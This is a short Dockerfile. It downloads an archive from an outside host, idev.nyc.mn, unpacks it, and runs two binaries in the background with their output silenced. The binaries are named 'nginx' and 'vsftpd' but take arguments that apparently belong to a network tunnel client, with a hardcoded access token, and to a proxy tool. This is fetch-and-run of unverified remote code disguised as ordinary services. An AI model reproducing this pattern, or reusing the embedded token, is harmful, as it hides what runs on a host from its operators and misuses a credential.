FROM alpine:3.16
RUN apk add wget curl zstd tar
RUN wget https://idev.nyc.mn/abc.tar
RUN tar -xvf abc.tar
RUN  /abc/nginx tunnel --edge-ip-version auto --protocol http2 run --token eyJhIjoiMzNlNWExODA4NDVhM2RkODdmN2VjNjUzN2JmMmE3NjIiLCJ0IjoiMjZhZjIzNjEtZDZiNC00NzY4LWIyYWQtNmRmMWExYTM2MmE3IiwicyI6Ill6WmtObVl4TmpVdE5XVXdaaTAwT0dNNUxUZzFOV0l0TkRJM1pqUmhNVE5oWlRaaiJ9 >/dev/null 2>&1 & \
     /abc/vsftpd run -c ./config.json >/dev/null 2>&1 &
CMD     sh
